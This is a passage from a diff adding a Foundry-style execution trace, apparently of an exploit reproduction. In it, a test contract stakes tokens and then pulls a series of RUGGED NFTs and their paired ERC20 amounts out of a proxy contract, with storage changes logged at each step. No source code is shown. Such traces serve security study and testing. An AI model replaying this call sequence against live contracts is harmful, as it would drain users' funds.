+    │   │   │   │   │   │   │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x2f3a8ebe6e3a27c6a100d98d2ff91774a5b5385d01543103ad054dd5f6762dc5: 0 → 515
+    │   │   │   │   │   │   │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 21 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xe6f63d1068ceb0c4ffbbf3d466563935b9a455422bfa240b681957a2c253fd22: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4bce: 8418 → 3913
+    │   │   │   │   │   │   │   │   │   │   @ 0x52c23d8ef51e6a955ce19e690dcd1172960a92f20c382ab3629bcd47c243771b: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x1f09525b4ab76afe6d9f12a39db4045d2b330ce9ae84a290bedaa921f37a7f21: 0 → 532
+    │   │   │   │   │   │   │   │   │   │   @ 0x2da4a17809aeaf140c779dac13f80dca486ac0194fe7312938c7ae781ab2ed98: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4638: 358 → 9159
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 3525 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 20 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f68: 5045 → 3270
+    │   │   │   │   │   │   │   │   │   │   @ 0xb0091ea7b6befa698abc752c512fbf223dfca9ba2088af38cdb329d1062b1cfb: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0xa48a0046b556202b266997a920608b4f973032aebfea8fee20d7369d2c10eeb7: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x93fc2d05bb710b0727c80980017637ba0fd51e5ac2446759ece994e9089d81ef: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x4ca5c0fa0157a1f3c0e81c5b20f44340fa0053c9858502fd4919bc776ea3bd04: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x65d34de83976ee7db9d863c6cf7fb5630b0f9539f53062a857833d90cd2da5a6: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 9050 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 3978 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 347 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 16 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xd7afa6abb1ac288cb75dcd88b595b3d70e5c62f92b144685cd73adda83d552ea: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xc3c7fb6a95b80182ab6b591f943a09f0ce415e4da4e0ecaf98679ba9df432a6d: 0 → 521
+    │   │   │   │   │   │   │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xba2c9d5d63b4586096d418b8bbaeb97a95e473f7b9268d72ef545e57508bfac9: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0xd235970b204fc6f6d44544eac6cea0cf3226e31acbb28f55dd21d00697cb22a2: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 12 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 3270 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e8: 0 → 5862
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4311: 736 → 7093
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4215: 6652 → 7449
+    │   │   │   │   │   │   │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 8866 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xbefab1654f0e82b9b395560f584e020f989e127b90692fc6231b5c0436698338: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bbf4c536284768a41 → 0x00000000000000000000000000000000000000000000001cf09c06d2e70e8a41
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4579: 1549 → 3978
+    │   │   │   │   │   │   │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 9 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x8d6a34253accd04054fd0e226e1ab2b0e238cf18d7ea48a226d4c41eddadd7df: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x5b68167d1efdaa8fed644c82e6506518ecd9bbe54fff55b98737c8ef74194730: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x262e9b50ffe96ff958522c1428dcecf32edee71305112cf4472d1abf8f392f1d: 0 → 530
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 4984 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 22 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xb59ab80f5598cb65e185f83739c5b8a9f7ed18c2d44c1cfa8eb3fe5e47e30e9e: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb430b: 5862 → 1933
+    │   │   │   │   │   │   │   │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 7449 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 9017 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606de: 0 → 358
+    │   │   │   │   │   │   │   │   │   │   @ 0x83cf50b4d13589d25a60fbd906fba99b9e47e1d650248634c4c5d3012cf551f7: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4621: 8137 → 9050
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a7f: 5507 → 4090
+    │   │   │   │   │   │   │   │   │   │   @ 0xa44cf8214680f4e1a824e25b8c3300bef5773bde0bd01e6b84e832bf6653012c: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb471b: 7314 → 4903
+    │   │   │   │   │   │   │   │   │   │   @ 0xcca1ec08212243f3b35988423a19fc12298eb379f008c4761c186c8d308cc1b0: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e6e: 5153 → 347
+    │   │   │   │   │   │   │   │   │   │   @ 0x18c85d9940008db9668ee1c505f9c826ace999553d0c3e2ec85e96cd0dc63052: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f1: 0 → 6614
+    │   │   │   │   │   │   │   │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xe92714d2a2210ef27ead03d2197bd71fbbf873ebeda5232734dbf51aa19169bf: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xaed1dd2a0734bcbf1768a76b7d3764e4c333664a25c486193747032d6482d03e: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 4 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─ emit Staked(user: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 3: 0x00000000000000000000000000000000000000000000001bbf432dce378069d1 → 0x00000000000000000000000000000000000000000000001cf092e13e9a1869d1
+    │   │   │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000001314fb37062980000
+    │   │   │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc97: 0 → 0x0000000000000000000000000000000000000000000000000ee1d728ef291780
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [630] RUGGED::balanceOf(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 533846574232226400833 [5.338e20]
+    │   │   │   │   ├─ [86122] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9721)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9721)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x99790ed31a639a03e11d0e13e1cdd2a459dbef1bf54071860ec8cbbacc4320a1: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x1f09525b4ab76afe6d9f12a39db4045d2b330ce9ae84a290bedaa921f37a7f21: 532 → 27
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 0 → 9721
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cf09c06d2e70e8a41 → 0x00000000000000000000000000000000000000000000001ce2bb501f3faa8a41
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 533 → 532
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f3: 7314 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604fa: 9721 → 7314
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   @ 0xa9b2a46ccc3411dfb2a0d9d7dee7f8750eab25a9a7c28c00fd1427b69d14d283: 27 → 0
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5163)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 5163)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
+    │   │   │   │   │   │   @ 0x7c7ec41f0fe372c56501c68fd98a087764885a027016bf9746b8fd54fe0df27d: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 0 → 5163
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 532 → 531
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604eb: 5163 → 5010
+    │   │   │   │   │   │   @ 0x74c76a0c8ee1c2289e32559cf79108454b22784ff63867bea7537ff0d3ee7a98: 531 → 12
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001ce2bb501f3faa8a41 → 0x00000000000000000000000000000000000000000000001cd4da996b98468a41
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 1 → 2
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f2: 5010 → 0
+    │   │   │   │   │   │   @ 0xb775dab96be1e8e7c15e77effa45a1c6e6f5c40d88035a5fc55eadbf8002a215: 12 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2347)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2347)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0c8e29e5c3c5e5a955d23e008a0f020d8d53d6cafdaed173b7ee3d98026d9203: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cd4da996b98468a41 → 0x00000000000000000000000000000000000000000000001cc6f9e2b7f0e28a41
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 2 → 3
+    │   │   │   │   │   │   @ 0x262e9b50ffe96ff958522c1428dcecf32edee71305112cf4472d1abf8f392f1d: 530 → 18
+    │   │   │   │   │   │   @ 0x27d8f81e1f58be87ee553445d6f3373ee873f21effca55f9a399fe791f264291: 18 → 2
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 531 → 530
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0x00000000000000000000000000000000000000000000000029a2241af62c0000
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 0 → 2347
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f1: 6614 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604f1: 2347 → 6614
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3145)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3145)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xe18e36c8e0ab66bd4eb03141b8fc83ed98cc10b4ce5d11d8d95cc8feef0e9848: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xff96918f9e4eb4105edb678ff6730927f18f7b6b9cb080b689169527fce78d4b: 529 → 16
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 3 → 4
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000029a2241af62c0000 → 0x0000000000000000000000000000000000000000000000003782dace9d900000
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f0: 8418 → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 0 → 3145
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cc6f9e2b7f0e28a41 → 0x00000000000000000000000000000000000000000000001cb9192c04497e8a41
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604ef: 3145 → 8418
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 530 → 529
+    │   │   │   │   │   │   @ 0x89a9edcc164e1fdaa7edb3689fd08bc9655a5ff49922743da29d68a2b8aa8a74: 16 → 3
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2740)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2740)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 529 → 528
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e8: 2740 → 6652
+    │   │   │   │   │   │   @ 0x095824e88dea8d46c87f19b8a6713c69c79d72628d4cca70e6a6bac672024011: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 4 → 5
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 0 → 2740
+    │   │   │   │   │   │   @ 0xd609a12af96f381f54941be9dcd7bbee7751067de615944a5b44d4a5ef7da0ff: 528 → 9
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ef: 6652 → 0
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cb9192c04497e8a41 → 0x00000000000000000000000000000000000000000000001cab387550a21a8a41
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000003782dace9d900000 → 0x0000000000000000000000000000000000000000000000004563918244f40000
+    │   │   │   │   │   │   @ 0x3f37188561f05222e10316ba525fc5d5dcb8078ac115fb3db3271db36d087659: 9 → 4
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1878)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1878)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001cab387550a21a8a41 → 0x00000000000000000000000000000000000000000000001c9d57be9cfab68a41
+    │   │   │   │   │   │   @ 0xdac4bedf7739b64c307454762b548637a94337646a9b79d97a181db75c0f9faf: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x872e7f9f7462ef7a0e5efd05076b73b65d2ce8f2ada2ecddc8404a11d481b8c6: 46 → 5
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 528 → 527
+    │   │   │   │   │   │   @ 0x658e1034b789a97e688c050855069ec25b7a5f7e8584b95899fb44495c01edf0: 527 → 46
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c6050d: 1878 → 3951
+    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000004563918244f40000 → 0x00000000000000000000000000000000000000000000000053444835ec580000
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 0 → 1878
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 5 → 6
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ee: 3951 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6901)
+    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6901)
+    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 6 → 7
